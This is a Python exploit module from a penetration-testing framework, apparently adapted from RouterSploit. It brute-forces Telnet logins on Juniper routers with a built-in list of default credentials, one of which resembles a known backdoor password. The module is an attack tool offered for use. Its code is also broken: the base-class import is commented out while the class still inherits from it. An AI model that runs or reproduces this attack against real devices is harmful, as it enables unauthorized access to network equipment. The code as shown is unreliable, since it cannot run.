# Absorbed from RouterSploit — rewritten for EmbedXPL v5.0.0
# Original authors preserved in __info__["authors"]
# EmbedXPL adaptation: André Henrique (@mrhenrike) | União Geek

from embedxpl.core.exploit import *
# SKIPPED: # FIXED: from routersploit.modules.creds.generic.telnet_default import Exploit as TelnetDefault


class Exploit(TelnetDefault):
    __info__ = {
        "name": "Juniper Router Default Telnet Creds",
        "description": "Module performs dictionary attack against Juniper Router Telnet service. "
                       "If valid credentials are foundm they are displayed to the user.",
        "authors": (
            "EmbedXPL absorption: André Henrique (@mrhenrike) | União Geek",
# SKIPPED:             "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "Juniper Router",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(23, "Target Telnet port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("admin:abc123,super:juniper123,admin:<<< %s(un=\'%s\') = %u.", "User:Pass or file with default credentials (file://)")
